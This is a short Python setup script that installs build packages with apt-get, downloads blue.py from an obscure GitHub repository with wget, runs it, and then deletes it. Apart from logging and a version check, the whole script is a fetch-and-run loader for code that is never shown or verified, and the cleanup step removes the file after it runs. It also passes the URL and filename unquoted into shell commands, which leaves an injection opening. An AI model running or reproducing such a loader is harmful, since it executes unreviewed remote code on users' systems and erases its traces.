#!/usr/bin/env python3

import os
import sys
import subprocess
import logging

# Set up logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s", filename="script.log")

# Function to run system commands with error handling
def run_command(command):
    try:
        result = subprocess.run(command, shell=True, check=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        logging.info(f"Command Output: {result.stdout}")
    except subprocess.CalledProcessError as e:
        logging.error(f"Error: {e.stderr}")
        sys.exit(1)

# Function to download a file and check if it's successful
def download_file(url, filename):
    logging.info(f"Downloading {filename} from {url}...")
    os.system(f"wget {url} -O {filename}")
    if not os.path.exists(filename):
        logging.error(f"Failed to download {filename}.")
        sys.exit(1)
    else:
        logging.info(f"Downloaded {filename} successfully.")

# Function to check if Python 3 is installed
def check_python_version():
    version = os.popen('python3 --version').read()
    if 'Python 3' not in version:
        logging.error("Python 3 is not installed.")
        sys.exit(1)
    logging.info(f"Using Python version: {version}")

# Main script execution
def main():
    logging.info("Starting script execution.")
    
    # Update packages and install dependencies
    run_command('apt-get update -y')
    run_command('apt-get install gcc make python python-dev -y')
    
    # Check Python version
    check_python_version()
    
    # Download the script
    download_file('https://raw.githubusercontent.com/grozlhrle/rainbows/main/blue.py', 'blue.py')

    # Execute the downloaded script
    run_command('python3 blue.py')

    # Clean up
    os.remove('blue.py')
    logging.info("Cleaned up temporary files.")

if __name__ == "__main__":
    main()
